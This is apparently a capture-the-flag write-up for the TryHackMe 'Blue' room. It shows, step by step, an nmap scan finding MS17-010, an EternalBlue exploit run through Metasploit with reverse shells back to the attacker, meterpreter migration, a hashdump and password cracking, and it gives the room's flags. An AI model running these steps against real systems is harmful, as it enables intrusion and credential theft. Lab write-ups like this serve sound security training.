---
date: 6/8/2025 00.00
layout: post
title: Blue
subtitle: Blue for TyHackMe Writeup.
description: >-
  in this blog i've explained how to root Blue from TryHackMe
image: https://tryhackme-images.s3.amazonaws.com/room-icons/7717bbc69c486931e503a74f3192a4d8.gif
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/7717bbc69c486931e503a74f3192a4d8.gif
category: tryhackme
tags:
  - tryhackme
  - injection
author: Mustafa Eltayeb
paginate: true
---
# Room Name [Blue](https://tryhackme.com/room/blue "Blue")
This room [Blue On TryHackMe] will cover active recon, hack into a Windows machine, leveraging common misconfigurations issues 
---
# Objective of room
This room will cover 
1. hack into a Windows machine
2. leveraging common misconfigurations issues

---

# RECON 

---

## Nmap

---

### first scan 

>**nmap --min-rate 10000  -p- 10.10.54.33**

### Result

```js
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

`nmap` found three standard Windows ports in `RPC (135)`, `NetBios (139)`, and `SMB (445)` 

### Advanced Scan

>**nmap -p 445,135,139 --script vuln 10.10.54.33**

```js
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
```

`Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)`

### Using MetaSploit To Gain Access

```js
msf > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2 
```

### Use 0 

```js 
msf > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://do
                                             cs.metasploit.com/docs/using-metas
                                             ploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to u
                                             se for authentication. Only affect
                                             s Windows Server 2008 R2, Windows
                                             7, Windows Embedded Standard 7 tar
                                             get machines.
   SMBPass                         no        (Optional) The password for the sp
                                             ecified username
   SMBUser                         no        (Optional) The username to authent
                                             icate as
   VERIFY_ARCH    true             yes       Check if remote architecture match
                                             es exploit Target. Only affects Wi
                                             ndows Server 2008 R2, Windows 7, W
                                             indows Embedded Standard 7 target
                                             machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit
                                              Target. Only affects Windows Serv
                                             er 2008 R2, Windows 7, Windows Emb
                                             edded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thre
                                        ad, process, none)
   LHOST     192.168.1.4      yes       The listen address (an interface may be
                                         specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

Let's Set `RHOST` to our target machine and run

```js
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhsots 10.10.155.206
[!] Unknown datastore option: rhsots. Did you mean RHOSTS?
rhsots => 10.10.155.206
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.155.206
rhosts => 10.10.155.206
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[+] 10.10.155.206:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.155.206:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.155.206:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Command shell session 1 opened (10.10.9.49:4444 -> 10.10.155.206:49251) at 2025-08-06 11:02:56 +0100


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
```

## Now We Gain Access

> **ctrl + z to save session** 

```js
C:\>^Z
Background session 1? [y/N]  y
```

## Time to convert shell to meterpreter shell 

>**use post/multi/manage/shell_to_meterpreter**

### Now I gain meterpreter shell:

```js
msf6 post(multi/manage/shell_to_meterpreter) > run
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.9.49:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (203846 bytes) to 10.10.155.206
[*] Stopping exploit/multi/handler
[*] Meterpreter session 2 opened (10.10.9.49:4433 -> 10.10.155.206:49268) at 2025-08-06 11:17:59 +0100

msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                  Information            Connection
  --  ----  ----                  -----------            ----------
  1         shell x64/windows     Shell Banner: Microso  10.10.9.49:4444 -> 10
                                  ft Windows [Version 6  .10.155.206:49251 (10
                                  .1.7601] -----         .10.155.206)
  2         meterpreter x64/wind  NT AUTHORITY\SYSTEM @  10.10.9.49:4433 -> 10
            ows                    JON-PC                .10.155.206:49265 (10
                                                         .10.155.206)
  

msf6 post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction with 2...

meterpreter > ls
Listing: C:\
============

Mode            Size   Type  Last modified            Name
----            ----   ----  -------------            ----
040777/rwxrwxr  0      dir   2018-12-13 03:13:36 +00  $Recycle.Bin
wx                           00
040777/rwxrwxr  0      dir   2009-07-14 06:08:56 +01  Documents and Settings
wx                           00
040777/rwxrwxr  0      dir   2009-07-14 04:20:08 +01  PerfLogs
wx                           00
040555/r-xr-xr  4096   dir   2019-03-17 22:22:01 +00  Program Files
-x                           00
040555/r-xr-xr  4096   dir   2019-03-17 22:28:38 +00  Program Files (x86)

wx                           00
100666/rw-rw-r  24     fil   2019-03-17 19:27:21 +00  flag1.txt
w-                           00
000000/-------  0      fif   1970-01-01 01:00:00 +01  hiberfil.sys
--                           00
000000/-------  0      fif   1970-01-01 01:00:00 +01  pagefile.sys
--                           00
meterpreter > 
```

## After Gaining Meterpreter Shell, I Will Move My Process ID to Another One with a Longer Lifetime

1. >ps
2. Choose Process Id
3. >migrate <Process Id>

```js
meterpreter > ps

Process List
============

 PID   PPID  Name         Arch  Session  User               Path
 ---   ----  ----         ----  -------  ----               ----
 0     0     [System Pro
             cess]
 4     0     System       x64   0
 416   4     smss.exe     x64   0        NT AUTHORITY\SYST  \SystemRoot\System
                                         EM                 32\smss.exe
 472   684   svchost.exe  x64   0        NT AUTHORITY\SYST
                                         EM
 544   492   csrss.exe    x64   0        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\csrss.exe
 564   684   svchost.exe  x64   0        NT AUTHORITY\SYST
                                         EM
 592   492   wininit.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
  ...........................................................................
             er.exe                      EM
 3036  752   powershell.  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
             exe                         EM                 2\WindowsPowerShel
                                                            l\v1.0\powershell.
                                                            exe

meterpreter > migrate 592
[*] Migrating from 2772 to 592...
[*] Migration completed successfully.
meterpreter >
```

## Get Users Hashes

```js
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter > 
```

### Crack User Hashes

```js 
💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.4 | 🥷 VPN IP ➜ 10.11.139.85
👀  ➜ ~ echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > hash.txt
💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.4 | 🥷 VPN IP ➜ 10.11.139.85
👀  ➜ ~ john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (?)
1g 0:00:00:07 DONE (2025-08-06 11:27) 0.1377g/s 1405Kp/s 1405Kc/s 1405KC/s alr1979..alpus
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.4 | 🥷 VPN IP ➜ 10.11.139.85
👀  ➜ ~ 
```

## The Password for Jon is `alqfna22`

## Time to Get All Flags

### flag1 in C Directory:

```js
meterpreter > pwd
C:\
meterpreter > cat flag1.txt
`flag{access_the_machine}`
```

### flag2 in C:\Windows\System32\config\SAM:

```js
meterpreter > cd Windows\\System32\\config\\
meterpreter > ls
Listing: C:\Windows\System32\config
===================================

Mode            Size      Type  Last modified           Name
----            ----      ----  -------------           ----                                                    s
040777/rwxrwxr  0         dir   2009-07-14 03:34:57 +0  Journal
wx                              100
040777/rwxrwxr  4096      dir   2025-08-06 10:17:49 +0  RegBack
wx                              100
100666/rw-rw-r  262144    fil   2019-03-17 20:05:08 +0  SAM
w-                              000
100666/rw-rw-r  1024      fil   2011-04-12 09:32:10 +0  SAM.LOG
w-                              100
100666/rw-rw-r  21504     fil   2019-03-17 22:39:12 +0  SAM.LOG1
w-                              000
100666/rw-rw-r  0         fil   2009-07-14 03:34:08 +0  SAM.LOG2

040777/rwxrwxr  4096      dir   2018-12-12 23:03:05 +0  TxR
wx                              000
100666/rw-rw-r  34        fil   2019-03-17 19:32:48 +0  flag2.txt
w-                              000
040777/rwxrwxr  4096      dir   2010-11-21 02:41:37 +0  systemprofile
wx                              000

meterpreter > cat flag2.txt
`flag{sam_database_elevated_access}`
```

### flag3 in C:\users\jon\Documents:

```js
meterpreter > pwd
C:\users\jon\Documents
meterpreter > cat flag3.txt
`flag{admin_documents_can_be_valuable}`
```

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style='border:none;'></iframe>